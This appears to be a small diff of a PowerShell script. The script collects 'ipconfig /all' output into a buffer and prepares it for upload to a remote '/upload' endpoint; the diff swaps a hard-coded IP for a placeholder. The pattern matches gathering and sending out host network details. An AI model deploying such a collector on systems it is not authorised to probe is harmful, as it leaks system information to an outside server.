@@ -15,7 +15,7 @@ $b = New-Object -TypeName System.Text.StringBuilder
 [void]$b.AppendLine("`n=I=")
 [void]$b.AppendLine((ipconfig /all | Out-String))
 
-$z = "https://192.168.20.66/upload"
+$z = "https://<UPDATE IP OF SERVER HERE>/upload"
 $utf8 = [System.Text.Encoding]::UTF8
 $bytes = $utf8.GetBytes($b.ToString())
 
